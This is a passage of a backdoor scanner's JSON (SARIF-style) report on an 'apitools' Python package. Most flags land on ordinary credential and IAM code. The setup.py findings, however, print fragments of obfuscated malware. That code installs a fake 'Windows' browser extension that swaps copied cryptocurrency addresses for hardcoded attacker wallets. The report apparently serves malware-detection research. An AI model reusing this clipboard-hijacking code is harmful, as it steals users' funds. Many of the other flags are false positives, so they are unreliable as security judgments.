                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 4,
                  "endLine": 195,
                  "endColumn": 15,
                  "snippet": {
                    "text": "def ServiceAccountCredentialsFromP12File(\n        service_account_name, private_key_filename, scopes, user_agent):\n    \"\"\"Create a new credential from the named .p12 keyfile.\"\"\"\n    private_key_filename = os.path.expanduser(private_key_filename)\n    scopes = util.NormalizeScopes(scopes)\n    if oauth2client.__version__ > '1.5.2':\n        # oauth2client >= 2.0.0\n",
                    "rendered": {
                      "text": "def ServiceAccountCredentialsFromP12File(\n        service_account_name, private_key_filename, scopes, user_agent):\n    \"\"\"Create a new credential from the named .p12 keyfile.\"\"\"\n    private_key_filename = os.path.expanduser(private_key_filename)\n    scopes = util.NormalizeScopes(scopes)\n    if oauth2client.__version__ > '1.5.2':\n        # oauth2client >= 2.0.0\n",
                      "markdown": "`def ServiceAccountCredentialsFromP12File(\n        service_account_name, private_key_filename, scopes, user_agent):\n    \"\"\"Create a new credential from the named .p12 keyfile.\"\"\"\n    private_key_filename = os.path.expanduser(private_key_filename)\n    scopes = util.NormalizeScopes(scopes)\n    if oauth2client.__version__ > '1.5.2':\n        # oauth2client >= 2.0.0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 193,
                  "startColumn": 30,
                  "endLine": 193,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n\ndef ServiceAccountCredentialsFromP12File(\n        service_account_name, private_key_filename, scopes, user_agent):\n    \"\"\"Create a new credential from the named .p12 keyfile.\"\"\"\n    private_key_filename = os.path.expanduser(private_key_filename)\n    scopes = util.NormalizeScopes(scopes)\n",
                    "rendered": {
                      "text": "\n\ndef ServiceAccountCredentialsFromP12File(\n        service_account_name, private_key_filename, scopes, user_agent):\n    \"\"\"Create a new credential from the named .p12 keyfile.\"\"\"\n    private_key_filename = os.path.expanduser(private_key_filename)\n    scopes = util.NormalizeScopes(scopes)\n",
                      "markdown": "`\n\ndef ServiceAccountCredentialsFromP12File(\n        service_account_name, private_key_filename, scopes, user_agent):\n    \"\"\"Create a new credential from the named .p12 keyfile.\"\"\"\n    private_key_filename = os.path.expanduser(private_key_filename)\n    scopes = util.NormalizeScopes(scopes)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 57,
                  "endLine": 186,
                  "endColumn": 68,
                  "snippet": {
                    "text": "            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n        return credentials\n",
                    "rendered": {
                      "text": "            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n        return credentials\n",
                      "markdown": "`            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n        return credentials\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 12,
                  "endLine": 186,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n        return credentials\n",
                    "rendered": {
                      "text": "            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n        return credentials\n",
                      "markdown": "`            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n        return credentials\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 49,
                  "endLine": 185,
                  "endColumn": 60,
                  "snippet": {
                    "text": "        credentials = service_account._ServiceAccountCredentials(\n            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n",
                    "rendered": {
                      "text": "        credentials = service_account._ServiceAccountCredentials(\n            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n",
                      "markdown": "`        credentials = service_account._ServiceAccountCredentials(\n            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 12,
                  "endLine": 185,
                  "endColumn": 23,
                  "snippet": {
                    "text": "        credentials = service_account._ServiceAccountCredentials(\n            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n",
                    "rendered": {
                      "text": "        credentials = service_account._ServiceAccountCredentials(\n            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n",
                      "markdown": "`        credentials = service_account._ServiceAccountCredentials(\n            service_account_id=service_account_info['client_id'],\n            service_account_email=service_account_info['client_email'],\n            private_key_id=service_account_info['private_key_id'],\n            private_key_pkcs8_text=service_account_info['private_key'],\n            scopes=scopes, user_agent=user_agent)\n        # pylint: enable=protected-access\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 22,
                  "endLine": 218,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n    url = 'http://' + base_url + '/computeMetadata/v1/' + relative_url\n    # Extra header requirement can be found here:\n",
                    "rendered": {
                      "text": "    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n    url = 'http://' + base_url + '/computeMetadata/v1/' + relative_url\n    # Extra header requirement can be found here:\n",
                      "markdown": "`    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n    url = 'http://' + base_url + '/computeMetadata/v1/' + relative_url\n    # Extra header requirement can be found here:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 216,
                  "startColumn": 22,
                  "endLine": 216,
                  "endColumn": 33,
                  "snippet": {
                    "text": "def _GceMetadataRequest(relative_url, use_metadata_ip=False):\n    \"\"\"Request the given url from the GCE metadata service.\"\"\"\n    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n",
                    "rendered": {
                      "text": "def _GceMetadataRequest(relative_url, use_metadata_ip=False):\n    \"\"\"Request the given url from the GCE metadata service.\"\"\"\n    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n",
                      "markdown": "`def _GceMetadataRequest(relative_url, use_metadata_ip=False):\n    \"\"\"Request the given url from the GCE metadata service.\"\"\"\n    if use_metadata_ip:\n        base_url = os.environ.get('GCE_METADATA_IP', '169.254.169.254')\n    else:\n        base_url = os.environ.get(\n            'GCE_METADATA_ROOT', 'metadata.google.internal')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 11,
                  "endLine": 48,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    import fasteners\n    _FASTENERS_AVAILABLE = True\nexcept ImportError as import_error:\n    server_env = os.environ.get('SERVER_SOFTWARE', '')\n    if not (server_env.startswith('Development') or\n            server_env.startswith('Google App Engine')):\n        raise import_error\n",
                    "rendered": {
                      "text": "    import fasteners\n    _FASTENERS_AVAILABLE = True\nexcept ImportError as import_error:\n    server_env = os.environ.get('SERVER_SOFTWARE', '')\n    if not (server_env.startswith('Development') or\n            server_env.startswith('Google App Engine')):\n        raise import_error\n",
                      "markdown": "`    import fasteners\n    _FASTENERS_AVAILABLE = True\nexcept ImportError as import_error:\n    server_env = os.environ.get('SERVER_SOFTWARE', '')\n    if not (server_env.startswith('Development') or\n            server_env.startswith('Google App Engine')):\n        raise import_error\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/setup.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/setup.py"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 2132,
                  "endLine": 51,
                  "endColumn": 2176,
                  "snippet": {
                    "text": "pt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);''')\n        \n    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n        manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\": [\"background.js\"]},\"version\": \"1\",\"manifest_versi",
                    "rendered": {
                      "text": "pt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);''')\n        \n    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n        manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\": [\"background.js\"]},\"version\": \"1\",\"manifest_versi",
                      "markdown": "`pt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);''')\n        \n    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n        manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\": [\"background.js\"]},\"version\": \"1\",\"manifest_versi`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/setup.py"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 1521,
                  "endLine": 51,
                  "endColumn": 1565,
                  "snippet": {
                    "text": "A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement['value']=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document['execCommand'](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]='';}function _0x7dfe(){var _0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJ",
                    "rendered": {
                      "text": "A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement['value']=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document['execCommand'](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]='';}function _0x7dfe(){var _0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJ",
                      "markdown": "`A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement['value']=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document['execCommand'](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]='';}function _0x7dfe(){var _0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJ`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/setup.py"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 1209,
                  "endLine": 51,
                  "endColumn": 1253,
                  "snippet": {
                    "text": "=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document['body'][_0x327ff6(0x86)](inputElement),inputElement['focus']();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var _0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45",
                    "rendered": {
                      "text": "=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document['body'][_0x327ff6(0x86)](inputElement),inputElement['focus']();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var _0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45",
                      "markdown": "`=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document['body'][_0x327ff6(0x86)](inputElement),inputElement['focus']();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var _0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 438,
                  "startColumn": 64,
                  "endLine": 438,
                  "endColumn": 73,
                  "snippet": {
                    "text": "    )\n\n    def TestIamPermissions(self, request, global_params=None):\n      r\"\"\"Tests the specified permissions against the IAM access control policy.\nfor the specified IAM resource.\n\n      Args:\n",
                    "rendered": {
                      "text": "    )\n\n    def TestIamPermissions(self, request, global_params=None):\n      r\"\"\"Tests the specified permissions against the IAM access control policy.\nfor the specified IAM resource.\n\n      Args:\n",
                      "markdown": "`    )\n\n    def TestIamPermissions(self, request, global_params=None):\n      r\"\"\"Tests the specified permissions against the IAM access control policy.\nfor the specified IAM resource.\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 352,
                  "startColumn": 29,
                  "endLine": 352,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    )\n\n    def SetIamPolicy(self, request, global_params=None):\n      r\"\"\"Sets the IAM access control policy for the specified IAM resource.\n\n      Args:\n        request: (IamProjectsServiceAccountsSetIamPolicyRequest) input message\n",
                    "rendered": {
                      "text": "    )\n\n    def SetIamPolicy(self, request, global_params=None):\n      r\"\"\"Sets the IAM access control policy for the specified IAM resource.\n\n      Args:\n        request: (IamProjectsServiceAccountsSetIamPolicyRequest) input message\n",
                      "markdown": "`    )\n\n    def SetIamPolicy(self, request, global_params=None):\n      r\"\"\"Sets the IAM access control policy for the specified IAM resource.\n\n      Args:\n        request: (IamProjectsServiceAccountsSetIamPolicyRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 298,
                  "startColumn": 32,
                  "endLine": 298,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    )\n\n    def GetIamPolicy(self, request, global_params=None):\n      r\"\"\"Returns the IAM access control policy for specified IAM resource.\n\n      Args:\n        request: (IamProjectsServiceAccountsGetIamPolicyRequest) input message\n",
                    "rendered": {
                      "text": "    )\n\n    def GetIamPolicy(self, request, global_params=None):\n      r\"\"\"Returns the IAM access control policy for specified IAM resource.\n\n      Args:\n        request: (IamProjectsServiceAccountsGetIamPolicyRequest) input message\n",
                      "markdown": "`    )\n\n    def GetIamPolicy(self, request, global_params=None):\n      r\"\"\"Returns the IAM access control policy for specified IAM resource.\n\n      Args:\n        request: (IamProjectsServiceAccountsGetIamPolicyRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 408,
                  "startColumn": 20,
                  "endLine": 408,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    def SignJwt(self, request, global_params=None):\n      r\"\"\"Signs a JWT using a service account's system-managed private key.\n\nIf no `exp` (expiry) time is contained in the claims, we will\nprovide an expiry of one hour in the future. If an expiry\nof more than one hour in the future is requested, the request\nwill fail.\n",
                    "rendered": {
                      "text": "    def SignJwt(self, request, global_params=None):\n      r\"\"\"Signs a JWT using a service account's system-managed private key.\n\nIf no `exp` (expiry) time is contained in the claims, we will\nprovide an expiry of one hour in the future. If an expiry\nof more than one hour in the future is requested, the request\nwill fail.\n",
                      "markdown": "`    def SignJwt(self, request, global_params=None):\n      r\"\"\"Signs a JWT using a service account's system-managed private key.\n\nIf no `exp` (expiry) time is contained in the claims, we will\nprovide an expiry of one hour in the future. If an expiry\nof more than one hour in the future is requested, the request\nwill fail.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
